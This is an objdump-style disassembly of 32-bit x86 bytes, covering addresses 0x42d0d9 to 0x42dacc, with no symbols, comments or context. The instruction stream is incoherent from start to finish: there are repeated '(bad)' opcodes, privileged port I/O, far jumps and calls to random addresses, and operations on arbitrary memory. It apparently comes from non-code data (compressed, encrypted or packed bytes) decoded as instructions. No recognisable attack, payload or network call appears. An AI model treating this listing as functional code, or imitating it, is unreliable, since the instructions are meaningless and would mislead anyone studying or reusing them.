  42d0d9:	div    DWORD PTR [edx-0x683fbb48]
  42d0df:	push   esi
  42d0e0:	adc    al,0x32
  42d0e2:	sbb    DWORD PTR [edx-0x389815f3],edx
  42d0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0e9:	out    0x63,eax
  42d0eb:	fcom   DWORD PTR [ebx+eax*2]
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [ebp-0x62],ah
  42d164:	and    eax,esi
  42d166:	jcxz   0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [eax-0x3b105ba0],bh
  42d173:	rcl    BYTE PTR [ebx+0x1fbdaa93],cl
  42d179:	in     al,0xa2
  42d17b:	mov    WORD PTR [ecx-0x3c],ds
  42d17e:	push   edi
  42d17f:	jmp    0x612a7295
  42d184:	mov    ds:0x8690dea0,al
  42d189:	enter  0x944e,0xd1
  42d18d:	xor    eax,0x3d8cd113
  42d192:	pop    edi
  42d193:	xchg   edi,eax
  42d194:	retf   
  42d195:	sub    BYTE PTR [edi+0x70],ah
  42d198:	shl    BYTE PTR [ebx-0x7089f7b7],0xe7
  42d19f:	sub    BYTE PTR [ebp+0x2d],dl
  42d1a2:	push   ecx
  42d1a3:	ins    BYTE PTR es:[edi],dx
  42d1a4:	dec    ebp
  42d1a5:	std    
  42d1a6:	clc    
  42d1a7:	fiadd  DWORD PTR [edi+0x66998c16]
  42d1ad:	dec    edi
  42d1ae:	cs aaa 
  42d1b0:	lock pushf 
  42d1b2:	fisub  WORD PTR [edi-0x79ccc4b1]
  42d1b8:	sub    al,0xef
  42d1ba:	cmp    esp,DWORD PTR [ebp+0x72a06e93]
  42d1c0:	aam    0x75
  42d1c2:	inc    eax
  42d1c3:	jecxz  0x42d17f
  42d1c5:	inc    ecx
  42d1c6:	xor    DWORD PTR [ebx+edi*4],ebp
  42d1c9:	cmp    eax,0x980512a6
  42d1ce:	aaa    
  42d1cf:	add    ah,BYTE PTR [ebx]
  42d1d1:	neg    edi
  42d1d3:	mov    ch,0x4
  42d1d5:	popa   
  42d1d6:	enter  0x9cdf,0xa9
  42d1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1dc:	xchg   edx,eax
  42d1dd:	pop    ebp
  42d1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1df:	sbb    DWORD PTR [edx+ecx*8],ebp
  42d1e2:	xor    al,0x80
  42d1e4:	cmp    BYTE PTR [edi-0x40c1543f],bh
  42d1ea:	pop    edi
  42d1eb:	cmp    edi,DWORD PTR [ecx+0x136cc843]
  42d1f1:	pop    ecx
  42d1f2:	scas   eax,DWORD PTR es:[edi]
  42d1f3:	std    
  42d1f4:	sbb    al,0x7
  42d1f6:	pop    ss
  42d1f7:	mov    esi,es
  42d1f9:	jge    0x42d1ec
  42d1fb:	sbb    BYTE PTR [ecx+0x6f],cl
  42d1fe:	call   0xdbdaec62
  42d203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d204:	xchg   edx,eax
  42d205:	add    al,0x4a
  42d207:	adc    DWORD PTR [esi+0x40470960],ebp
  42d20d:	stos   BYTE PTR es:[edi],al
  42d20e:	aaa    
  42d20f:	sbb    ebp,DWORD PTR [ebx-0x8335f79]
  42d215:	sub    BYTE PTR [ecx-0x7b],bl
  42d218:	aam    0x8a
  42d21a:	jg     0x42d228
  42d21c:	xor    al,0xfc
  42d21e:	cmp    esp,esp
  42d220:	fild   QWORD PTR gs:[esi-0xc]
  42d224:	dec    ebp
  42d225:	xchg   ebx,eax
  42d226:	or     BYTE PTR [ecx-0x56a0b10],0x4c
  42d22d:	cmp    edi,DWORD PTR [edi-0x20]
  42d230:	mov    bl,0x80
  42d232:	fdiv   st(5),st
  42d234:	aas    
  42d235:	mov    edi,0x157ff6e1
  42d23a:	jmp    0x66a:0xbabb6f06
  42d241:	adc    ecx,DWORD PTR ds:0x40ebf3c
  42d247:	sub    eax,0x6b9b70a6
  42d24c:	call   0x9645:0x2bb76967
  42d253:	loop   0x42d2b8
  42d255:	in     eax,0x7
  42d257:	sahf   
  42d258:	mov    WORD PTR [ebx+0x17baafb9],gs
  42d25e:	jecxz  0x42d21c
  42d260:	fmul   DWORD PTR [edx]
  42d262:	mov    bl,BYTE PTR [ebx+ebx*8]
  42d265:	daa    
  42d266:	xchg   edx,eax
  42d267:	mov    bl,0x44
  42d269:	inc    esp
  42d26a:	add    al,0xb3
  42d26c:	repz sub BYTE PTR [eax],al
	...
  42d2d3:	add    BYTE PTR [eax],al
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d352
  42d2e3:	repnz mov fs,WORD PTR [edx+0x67]
  42d2e7:	in     al,0x1
  42d2e9:	add    BYTE PTR [eax],al
  42d2eb:	add    DWORD PTR [eax],eax
  42d2ed:	add    BYTE PTR [esi+0x23],bl
  42d2f0:	push   ss
  42d2f1:	jge    0x42d2aa
  42d2f3:	jg     0x42d326
  42d2f5:	xor    bl,BYTE PTR [esi+0x61c88cf1]
  42d2fb:	xor    edx,DWORD PTR [ebx]
  42d2fd:	fist   WORD PTR [eax]
  42d2ff:	inc    esp
  42d300:	dec    eax
  42d301:	mov    ecx,eax
  42d303:	popf   
  42d304:	test   BYTE PTR [eax-0x4e],dl
  42d307:	add    al,0x43
  42d309:	fild   WORD PTR [esi+0x1e]
  42d30c:	cmp    DWORD PTR [eax-0x68698699],edx
  42d312:	cmp    ebp,esp
  42d314:	not    BYTE PTR [ebx]
  42d316:	inc    esi
  42d317:	inc    DWORD PTR [edx]
  42d319:	out    0x9d,al
  42d31b:	push   0x74
  42d31d:	(bad)  
  42d31f:	push   cs
  42d320:	inc    ebx
  42d321:	add    ah,BYTE PTR [esp+ebx*8+0x7dc37f42]
  42d328:	rcl    BYTE PTR [edi],1
  42d32a:	lahf   
  42d32b:	sub    DWORD PTR [edi-0x3ac279c5],0xffffffec
  42d332:	imul   esp,DWORD PTR [esi+eax*1-0x77],0xffffffc7
  42d337:	in     al,dx
  42d338:	lds    edx,FWORD PTR [ecx-0x45ed5885]
  42d33e:	arpl   WORD PTR [edx-0x2f],ax
  42d341:	gs and eax,0x2e9a070d
  42d347:	std    
  42d348:	aas    
  42d349:	mov    ebx,0xa89af5b3
  42d34e:	imul   ebp,ecx,0xffffff84
  42d351:	pop    esp
  42d352:	push   eax
  42d353:	lods   eax,DWORD PTR ds:[esi]
  42d354:	out    dx,al
  42d355:	sbb    al,0xfb
  42d357:	add    al,0x55
  42d359:	retf   
  42d35a:	lahf   
  42d35b:	mov    eax,ds:0x7e6f5bc3
  42d360:	jno    0x42d35c
  42d362:	sbb    BYTE PTR ds:0xefc34c8d,cl
  42d368:	cmc    
  42d369:	cmp    ebp,DWORD PTR [ebx+0x1a4afca]
  42d36f:	fwait
  42d370:	mov    DWORD PTR [ecx+0x35],ebx
  42d373:	cli    
  42d374:	fwait
  42d375:	lods   al,BYTE PTR ds:[esi]
  42d376:	arpl   si,bx
  42d378:	sub    eax,0x32843d17
  42d37d:	jne    0x42d3c1
  42d37f:	adc    BYTE PTR [edi+0x2f],ah
  42d382:	mov    BYTE PTR [ecx-0x2d],ah
  42d385:	test   BYTE PTR [esi+0x19a06919],cl
  42d38b:	mov    DWORD PTR [esi],edx
  42d38d:	imul   ebx,DWORD PTR [ebx-0x47d7168d],0x1e
  42d394:	or     ch,ah
  42d396:	mov    cl,0x3
  42d398:	pop    ebp
  42d399:	pop    ds
  42d39a:	inc    edi
  42d39b:	ins    BYTE PTR es:[edi],dx
  42d39c:	je     0x42d3db
  42d39e:	sub    dh,BYTE PTR [ecx+0x27c5f1a]
  42d3a4:	mov    al,ds:0x9ef910dc
  42d3a9:	push   esi
  42d3aa:	in     al,0x0
  42d3ac:	scas   al,BYTE PTR es:[edi]
  42d3ad:	fstp   TBYTE PTR [edx-0x60]
  42d3b0:	aaa    
  42d3b1:	out    0x9,al
  42d3b3:	cmp    al,BYTE PTR [ebp+0x5]
  42d3b6:	int    0x47
  42d3b8:	repnz outs dx,DWORD PTR ds:[esi]
  42d3ba:	push   ss
  42d3bb:	jecxz  0x42d383
  42d3bd:	jne    0x42d387
  42d3bf:	cs cmp eax,0x123e5280
  42d3c5:	neg    DWORD PTR [edi]
  42d3c7:	mov    ch,0x29
  42d3c9:	out    0x1b,eax
  42d3cb:	jmp    0xb161:0x390c5abd
  42d3d2:	push   0x11
  42d3d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d3d5:	neg    DWORD PTR [ebp+0xa2cd36d]
  42d3db:	popf   
  42d3dc:	lahf   
  42d3dd:	push   0xf81cf72c
  42d3e2:	adc    bl,ah
  42d3e4:	mov    esi,0xd578bc0a
  42d3e9:	int    0xc1
  42d3eb:	fldcw  WORD PTR [ebx]
  42d3ed:	xor    al,0x0
	...
  42d453:	add    BYTE PTR [eax],al
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	pop    ds
  42d463:	out    0xa0,eax
  42d465:	jno    0x42d4ce
  42d467:	in     eax,0x1
  42d469:	add    BYTE PTR [eax],al
  42d46b:	add    DWORD PTR [eax],eax
  42d46d:	add    BYTE PTR [esi],bl
  42d46f:	clc    
  42d470:	push   cs
  42d471:	xchg   BYTE PTR [esp+ebp*2-0x33],dh
  42d475:	fsub   DWORD PTR [ebx]
  42d477:	pusha  
  42d478:	addr16 inc esi
  42d47a:	data16 mov BYTE PTR [ebx+0x3548659f],bl
  42d481:	mov    bl,0x3
  42d483:	xchg   edx,eax
  42d484:	mov    ebx,0xc2ec2023
  42d489:	jo     0x42d456
  42d48b:	retf   
  42d48c:	cmp    ah,al
  42d48e:	pusha  
  42d48f:	sti    
  42d490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d491:	inc    esp
  42d492:	or     bl,BYTE PTR [ebp+0x11]
  42d495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d496:	mov    ebp,DWORD PTR [eax+0x2]
  42d499:	(bad)  
  42d49a:	in     al,0x3a
  42d49c:	ror    BYTE PTR [ebp+0x29],0x69
  42d4a0:	pop    ds
  42d4a1:	out    0x29,eax
  42d4a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4a4:	faddp  st(2),st
  42d4a6:	xor    DWORD PTR [ebp-0x7ada3121],edx
  42d4ac:	push   es
  42d4ad:	pusha  
  42d4ae:	push   ds
  42d4af:	mov    al,0x61
  42d4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4b2:	push   0x25
  42d4b4:	add    BYTE PTR [eax],dh
  42d4b6:	stos   DWORD PTR es:[edi],eax
  42d4b7:	xlat   BYTE PTR ds:[ebx]
  42d4b8:	jbe    0x42d4a5
  42d4ba:	les    ecx,FWORD PTR [esi-0x5257c0f3]
  42d4c0:	(bad)  
  42d4c1:	enter  0xd463,0x9d
  42d4c5:	pop    esp
  42d4c6:	cmp    esi,DWORD PTR [edx+0x14e46367]
  42d4cc:	xor    ebx,ebx
  42d4ce:	pop    di
  42d4d1:	popa   
  42d4d2:	mov    ch,0xdf
  42d4d4:	repnz loope 0x42d4d4
  42d4d7:	retf   0x4c2
  42d4da:	xchg   ebx,eax
  42d4db:	add    DWORD PTR [ecx+0x54952ff8],edx
  42d4e1:	jnp    0x42d4e3
  42d4e3:	mov    ah,0x53
  42d4e5:	cmp    BYTE PTR [ecx],dl
  42d4e7:	rcl    DWORD PTR [edi],0xdc
  42d4ea:	and    bh,dl
  42d4ec:	es leave 
  42d4ee:	mov    esi,0x64e14a
  42d4f3:	addr16 jmp 0xb08a:0xf12cac4d
  42d4fb:	dec    edx
  42d4fc:	xor    BYTE PTR [ebx-0x7704b543],dl
  42d502:	push   0x5c
  42d504:	ret    
  42d505:	jbe    0x42d531
  42d507:	push   cs
  42d508:	and    eax,0x595e1e42
  42d50d:	cli    
  42d50e:	adc    esp,ebp
  42d510:	arpl   WORD PTR [esi-0x38],si
  42d513:	jg     0x42d4b3
  42d515:	and    DWORD PTR [eax],ecx
  42d517:	idiv   DWORD PTR [eax-0x6cdfbb28]
  42d51d:	mov    esp,0xeac3d0f6
  42d522:	pop    es
  42d523:	jl     0x42d56a
  42d525:	cmp    eax,0xb8c81c95
  42d52a:	mov    esi,0xcef62919
  42d52f:	adc    dl,BYTE PTR [ecx]
  42d531:	rcl    BYTE PTR ds:0x597d7e26,0x1b
  42d538:	dec    eax
  42d539:	xlat   BYTE PTR ds:[ebx]
  42d53a:	sub    ebp,ecx
  42d53c:	mov    ss,WORD PTR [eax]
  42d53e:	pop    ss
  42d53f:	cmp    eax,0xbc54a96b
  42d544:	mov    edi,0x30bd61d7
  42d549:	dec    ebx
  42d54a:	ret    0x48ef
  42d54d:	mov    ecx,0x145dd712
  42d552:	add    ebp,DWORD PTR [ebx+0x9]
  42d555:	hlt    
  42d556:	pop    ss
  42d557:	push   ebx
  42d558:	mov    ah,0xaf
  42d55a:	sub    al,0x93
  42d55c:	mov    ecx,0xa3a9b752
  42d561:	sub    ecx,DWORD PTR [edx-0x2a]
  42d564:	add    BYTE PTR [esi+0x1c6ccf5e],0x3e
  42d56b:	or     eax,0x7ded
	...
  42d5d4:	add    BYTE PTR [eax],al
  42d5d6:	cdq    
  42d5d7:	cmc    
  42d5d8:	adc    BYTE PTR [ebx-0x12],0x77
  42d5dc:	fcos   
  42d5de:	pop    ebp
  42d5df:	mov    ds:0x136718d5,eax
  42d5e5:	lahf   
  42d5e6:	addr16 out 0x1,al
  42d5e9:	add    BYTE PTR [eax],al
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    BYTE PTR [ebx],bh
  42d5ef:	in     eax,dx
  42d5f0:	lods   al,BYTE PTR ds:[esi]
  42d5f1:	jmp    0x683ebecc
  42d5f6:	cdq    
  42d5f7:	cdq    
  42d5f8:	pop    ecx
  42d5f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5fa:	stos   BYTE PTR es:[edi],al
  42d5fb:	sbb    BYTE PTR [ecx-0x36],ah
  42d5fe:	jnp    0x42d653
  42d600:	jl     0x42d5e4
  42d602:	xchg   DWORD PTR [edi+0x11],ecx
  42d605:	sar    edi,1
  42d607:	sbb    ebx,ecx
  42d609:	sbb    eax,0x6f50da66
  42d60e:	addr16 jmp 0x42d67b
  42d611:	xor    dl,0x2d
  42d614:	add    BYTE PTR [ecx],ch
  42d616:	(bad)  
  42d617:	sbb    edi,DWORD PTR [ebx-0xe]
  42d61a:	shl    BYTE PTR [ebx],0xf5
  42d61d:	in     eax,0x3f
  42d61f:	sahf   
  42d620:	gs out 0x38,eax
  42d623:	or     esp,DWORD PTR [ecx+ebp*4+0x5c]
  42d627:	je     0x42d63a
  42d629:	xchg   BYTE PTR [ecx-0x3c],cl
  42d62c:	inc    esp
  42d62d:	pop    ds
  42d62e:	cld    
  42d62f:	rcr    DWORD PTR [ecx],1
  42d631:	lahf   
  42d632:	out    0x57,al
  42d634:	pop    edx
  42d635:	push   es
  42d636:	xor    dh,BYTE PTR [ebp+0x17]
  42d639:	cmp    eax,0x27f2a84e
  42d63e:	f2xm1  
  42d640:	mov    ecx,0x7dcf9ebf
  42d645:	mov    ebp,0x2334987c
  42d64a:	rcr    eax,cl
  42d64c:	inc    edi
  42d64d:	xor    ecx,DWORD PTR [edi+0x3b]
  42d650:	pop    ss
  42d651:	inc    edi
  42d652:	jno    0x42d66a
  42d654:	xor    DWORD PTR [ebp-0x1c],edx
  42d657:	jno    0x42d671
  42d659:	mov    ecx,0xc06c8c73
  42d65e:	nop
  42d65f:	dec    ebx
  42d660:	mov    ?,WORD PTR [eax]
  42d662:	stos   BYTE PTR es:[edi],al
  42d663:	cli    
  42d664:	repz mov bl,0x45
  42d667:	jo     0x42d6da
  42d669:	push   0x8b9d088
  42d66e:	shl    DWORD PTR [ebp+0x54],0x71
  42d672:	push   edx
  42d673:	add    eax,0x45dfbd8c
  42d678:	shl    BYTE PTR [esi-0x76],0xdf
  42d67c:	ja     0x42d686
  42d67e:	test   BYTE PTR [eax],bh
  42d680:	in     eax,dx
  42d681:	outs   dx,BYTE PTR ds:[esi]
  42d682:	dec    esi
  42d683:	push   edx
  42d684:	cli    
  42d685:	ins    DWORD PTR es:[edi],dx
  42d686:	xchg   esp,eax
  42d687:	int3   
  42d688:	inc    esp
  42d689:	mov    ds:0xcfe1be4,eax
  42d68e:	ret    
  42d68f:	mov    al,0x65
  42d691:	les    edi,FWORD PTR [ebx]
  42d693:	or     DWORD PTR [ebp+0x5b80127c],esp
  42d699:	pushf  
  42d69a:	jmp    0x42d719
  42d69c:	mov    edx,0x130e0b64
  42d6a1:	xor    eax,DWORD PTR [ecx+0xb]
  42d6a4:	adc    BYTE PTR [ecx+0x17],0xb0
  42d6a8:	xchg   BYTE PTR [esp+eax*4-0x21],cl
  42d6ac:	or     DWORD PTR [ecx-0x6376409b],0xbda585b3
  42d6b6:	dec    ebp
  42d6b7:	jecxz  0x42d67c
  42d6b9:	fs jp  0x42d69e
  42d6bc:	in     al,dx
  42d6bd:	mov    al,ds:0xf99dbd69
  42d6c2:	dec    ebp
  42d6c3:	retf   
  42d6c4:	sbb    BYTE PTR gs:[ebp-0x28],bh
  42d6c8:	pushf  
  42d6c9:	scas   eax,DWORD PTR es:[edi]
  42d6ca:	(bad)  
  42d6cb:	cmc    
  42d6cc:	jmp    0xb28a24b0
  42d6d1:	mov    dl,0x1c
  42d6d3:	add    DWORD PTR [edi-0x6156503a],eax
  42d6d9:	(bad)  
  42d6da:	rol    ecx,1
  42d6dc:	bound  esp,QWORD PTR [ecx+ecx*8]
  42d6df:	add    BYTE PTR [eax+edi*4-0x69187dc4],dh
  42d6e6:	pop    ebx
  42d6e7:	pop    ebp
  42d6e8:	enter  0x2d6d,0xb2
  42d6ec:	sbb    BYTE PTR [ecx],al
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x3c
  42d763:	sbb    eax,0xe76795d6
  42d768:	add    DWORD PTR [eax],eax
  42d76a:	add    BYTE PTR [ecx],al
  42d76c:	add    BYTE PTR [eax],al
  42d76e:	(bad)  
  42d76f:	cmp    cl,BYTE PTR [edi+0x49]
  42d772:	fild   DWORD PTR [edx+0x63d809f]
  42d778:	and    al,0x1e
  42d77a:	add    eax,DWORD PTR [ebx-0x26e55ede]
  42d780:	add    DWORD PTR [eax-0x11abfb11],edx
  42d786:	pop    esp
  42d787:	sbb    al,0x47
  42d789:	xchg   ecx,eax
  42d78a:	in     al,0x17
  42d78c:	and    dh,0x2f
  42d78f:	inc    esi
  42d790:	sbb    edi,DWORD PTR [eax]
  42d792:	pop    edx
  42d793:	dec    edi
  42d794:	inc    ebp
  42d795:	fldlg2 
  42d797:	mov    al,0xd3
  42d799:	mov    dl,0x35
  42d79b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d79c:	dec    ebp
  42d79d:	xchg   edi,eax
  42d79e:	outs   dx,BYTE PTR ds:[esi]
  42d79f:	jo     0x42d758
  42d7a1:	ret    
  42d7a2:	(bad)  
  42d7a4:	lods   al,BYTE PTR ds:[esi]
  42d7a5:	cmp    ch,ah
  42d7a7:	fucom  st(6)
  42d7a9:	adc    al,0x63
  42d7ab:	mov    bl,0xa6
  42d7ad:	call   0x4ee9a553
  42d7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7b3:	bound  edi,QWORD PTR [eax+0x755d0757]
  42d7b9:	dec    edx
  42d7ba:	inc    edx
  42d7bb:	hlt    
  42d7bc:	mov    ds:0x47b43a6b,al
  42d7c1:	ja     0x42d7d1
  42d7c3:	(bad)  
  42d7c5:	push   edi
  42d7c6:	cwde   
  42d7c7:	stc    
  42d7c8:	or     eax,0xf5c18111
  42d7cd:	ror    eax,cl
  42d7cf:	test   BYTE PTR [edx],0xe8
  42d7d2:	xor    BYTE PTR [edi-0x49f8c03c],cl
  42d7d8:	cmp    esi,DWORD PTR [eax-0x67]
  42d7db:	or     ch,0x1f
  42d7de:	cmp    eax,0x5fd32d3f
  42d7e3:	push   es
  42d7e4:	dec    esi
  42d7e5:	out    dx,eax
  42d7e6:	jae    0x42d7e3
  42d7e8:	or     DWORD PTR [edx+0x4c65c35f],edi
  42d7ee:	dec    esp
  42d7ef:	(bad)  
  42d7f0:	cmp    DWORD PTR [ebp-0xe30db55],esp
  42d7f6:	push   edi
  42d7f7:	and    bh,BYTE PTR [esi+edx*1-0x42d3e6bc]
  42d7fe:	aaa    
  42d7ff:	loopne 0x42d80e
  42d801:	in     eax,dx
  42d802:	fninit 
  42d804:	xchg   esp,eax
  42d805:	add    al,0x19
  42d807:	cmp    DWORD PTR [ebx-0x23],0x7165fd0d
  42d80e:	rol    ah,1
  42d810:	dec    ebx
  42d811:	xchg   ebp,eax
  42d812:	dec    ecx
  42d813:	popf   
  42d814:	ret    0xeded
  42d817:	cmp    BYTE PTR [ebx-0x6514582a],dh
  42d81d:	into   
  42d81e:	jp     0x42d82e
  42d820:	adc    ecx,DWORD PTR [edx]
  42d822:	mov    ch,0x74
  42d824:	sti    
  42d825:	pushf  
  42d826:	pop    ss
  42d827:	cmp    bl,BYTE PTR ds:0xf7edffae
  42d82d:	loope  0x42d8ad
  42d82f:	sbb    eax,0xdd84a786
  42d834:	bound  edx,QWORD PTR [ecx]
  42d836:	rcr    BYTE PTR ds:0x558e3273,1
  42d83c:	dec    ebp
  42d83d:	xchg   esp,eax
  42d83e:	mov    dl,0x29
  42d840:	pop    es
  42d841:	clc    
  42d842:	(bad)  
  42d843:	in     eax,dx
  42d844:	loope  0x42d814
  42d846:	inc    ebx
  42d847:	outs   dx,BYTE PTR ds:[esi]
  42d848:	mov    ah,0x3f
  42d84a:	xor    ecx,DWORD PTR [edx+ebp*1]
  42d84d:	mov    esp,0x87700ec8
  42d852:	sub    al,0x6a
  42d854:	jl     0x42d7e4
  42d856:	and    BYTE PTR [edx-0x45f7292c],bl
  42d85c:	dec    ecx
  42d85d:	pusha  
  42d85e:	push   edi
  42d85f:	inc    BYTE PTR [esi+0xc]
  42d862:	xchg   edi,eax
  42d863:	mov    WORD PTR [ecx-0x72a4dfc7],ss
  42d869:	mov    esi,0xfae2b2fd
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x54c6961a
  42d8e3:	push   edx
  42d8e4:	cdq    
  42d8e5:	and    DWORD PTR [edi-0x18],0x1
  42d8e9:	add    BYTE PTR [eax],al
  42d8eb:	add    DWORD PTR [eax],eax
  42d8ed:	add    dl,bl
  42d8ef:	xlat   BYTE PTR ds:[ebx]
  42d8f0:	pop    edx
  42d8f1:	stc    
  42d8f2:	sbb    BYTE PTR [eax+eiz*4],0x64
  42d8f6:	bound  ebx,QWORD PTR [edi+0x33]
  42d8f9:	fstp   DWORD PTR [ecx]
  42d8fb:	test   al,0x9e
  42d8fd:	imul   ebx,DWORD PTR [ecx+0x23],0x7f92958e
  42d904:	cld    
  42d905:	js     0x42d93f
  42d907:	lea    ecx,[esi]
  42d909:	xor    al,0x4e
  42d90b:	or     eax,0xdd4ec102
  42d910:	lds    eax,FWORD PTR [esi]
  42d912:	stc    
  42d913:	inc    esi
  42d914:	xchg   esi,eax
  42d915:	adc    dh,BYTE PTR [edx]
  42d917:	add    BYTE PTR [ebx+0x4cd3397d],bh
  42d91d:	sub    ah,BYTE PTR [ebx+0x2]
  42d920:	in     eax,dx
  42d921:	push   0x2a96355b
  42d926:	lods   eax,DWORD PTR ds:[esi]
  42d927:	pop    ds
  42d928:	push   ds
  42d929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d92a:	cmp    al,0xb
  42d92c:	mov    cl,0x20
  42d92e:	add    eax,DWORD PTR [edi+eax*4]
  42d931:	test   eax,0xf799c2f8
  42d936:	and    ecx,DWORD PTR [esi-0x4529bfcc]
  42d93c:	dec    eax
  42d93d:	xchg   ebp,eax
  42d93e:	xchg   edx,eax
  42d93f:	mov    esp,0x4ddb4c0c
  42d944:	fst    DWORD PTR [ecx]
  42d946:	bound  esp,QWORD PTR [edx+ebx*1-0x39]
  42d94a:	cmp    eax,0x5b941920
  42d94f:	int    0x1d
  42d951:	xchg   ecx,eax
  42d952:	(bad)  
  42d953:	fild   QWORD PTR [eax]
  42d955:	jbe    0x42d9b7
  42d957:	outs   dx,BYTE PTR ds:[esi]
  42d958:	mov    edx,0xdcffdf7d
  42d95d:	xor    dl,cl
  42d95f:	sbb    DWORD PTR [ebx-0x33],edx
  42d962:	scas   eax,DWORD PTR es:[edi]
  42d963:	push   esi
  42d964:	mov    ebx,0x347a51a0
  42d969:	mov    eax,0xa9abd656
  42d96e:	push   es
  42d96f:	loopne 0x42d985
  42d971:	jae    0x42d945
  42d973:	retf   0x9d6b
  42d976:	ror    bl,0xd5
  42d979:	shl    BYTE PTR [ecx+0x3581c110],cl
  42d97f:	ror    BYTE PTR ds:0xdf85a77a,1
  42d985:	cdq    
  42d986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d987:	xor    al,ah
  42d989:	cli    
  42d98a:	sbb    al,0x2f
  42d98c:	jmp    0x42d95d
  42d98e:	pop    ecx
  42d98f:	add    DWORD PTR [ecx+0x71],0x37
  42d993:	xor    ah,dl
  42d995:	push   es
  42d996:	scas   eax,DWORD PTR es:[edi]
  42d997:	or     BYTE PTR [edi+0x40e9687c],cl
  42d99d:	and    edx,DWORD PTR ds:0x53c8b029
  42d9a3:	mov    dl,0x10
  42d9a5:	fdivr  st(1),st
  42d9a7:	rcl    al,1
  42d9a9:	lods   eax,DWORD PTR ds:[esi]
  42d9aa:	and    al,0x6c
  42d9ac:	xchg   BYTE PTR [esi+0x741c7d89],dh
  42d9b2:	mov    ecx,0x7e30340c
  42d9b7:	icebp  
  42d9b8:	or     DWORD PTR [eax-0x5b],ecx
  42d9bb:	shl    DWORD PTR [edx-0x31735544],cl
  42d9c1:	in     al,0x62
  42d9c3:	aaa    
  42d9c4:	es js  0x42d9e1
  42d9c7:	mov    bl,0xbf
  42d9c9:	mov    al,0xa
  42d9cb:	mov    edx,0x9ac745a9
  42d9d0:	lods   al,BYTE PTR ds:[esi]
  42d9d1:	xchg   ecx,eax
  42d9d2:	scas   al,BYTE PTR es:[edi]
  42d9d3:	dec    edx
  42d9d4:	push   ebp
  42d9d5:	in     eax,0x52
  42d9d7:	and    eax,0xf7fb390d
  42d9dc:	das    
  42d9dd:	faddp  st(1),st
  42d9df:	(bad)  
  42d9e0:	cli    
  42d9e1:	and    DWORD PTR [edx],ebx
  42d9e3:	push   eax
  42d9e4:	jnp    0x42d9f6
  42d9e6:	neg    DWORD PTR [ebp+0x28524aa5]
  42d9ec:	push   cs
  42d9ed:	add    BYTE PTR [bx+si],al
	...
  42da54:	add    BYTE PTR [eax],al
  42da56:	stc    
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	sar    ebp,cl
  42da64:	out    0xf1,eax
  42da66:	addr16 jmp 0x142da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da6f:	cmp    dh,dl
  42da71:	jl     0x42d9ff
  42da73:	daa    
  42da74:	into   
  42da75:	rol    cl,cl
  42da77:	and    dh,BYTE PTR [esi]
  42da79:	jle    0x42da8b
  42da7b:	fbstp  TBYTE PTR [eax+0x345e2478]
  42da81:	mov    ss,WORD PTR [ebp+0x4c]
  42da84:	js     0x42da4f
  42da86:	push   esp
  42da87:	mov    ch,0xa4
  42da89:	cli    
  42da8a:	ret    0x1030
  42da8d:	(bad)  
  42da8f:	les    esp,FWORD PTR [edi-0x50]
  42da92:	add    DWORD PTR [ebp-0xecbd56],ecx
  42da98:	stc    
  42da99:	cmp    ebx,ebp
  42da9b:	xchg   edx,eax
  42da9c:	pop    es
  42da9d:	out    dx,eax
  42da9e:	mov    ah,0xef
  42daa0:	in     al,dx
  42daa1:	sbb    eax,0x636591cd
  42daa6:	inc    eax
  42daa7:	je     0x42da2b
  42daa9:	push   ecx
  42daaa:	lea    ecx,[esi+0x43]
  42daad:	stc    
  42daae:	aaa    
  42daaf:	pop    ecx
  42dab0:	je     0x42da37
  42dab2:	cmc    
  42dab3:	sub    BYTE PTR [eax+0x2e],ah
  42dab6:	xor    al,0x6b
  42dab8:	bound  esi,QWORD PTR [ecx-0x519e03e8]
  42dabe:	dec    eax
  42dabf:	mov    ds,WORD PTR [esi+0x22e49217]
  42dac5:	mov    edi,0x4d9efad8
  42daca:	fst    QWORD PTR [edi]
  42dacc:	adc    al,0xce
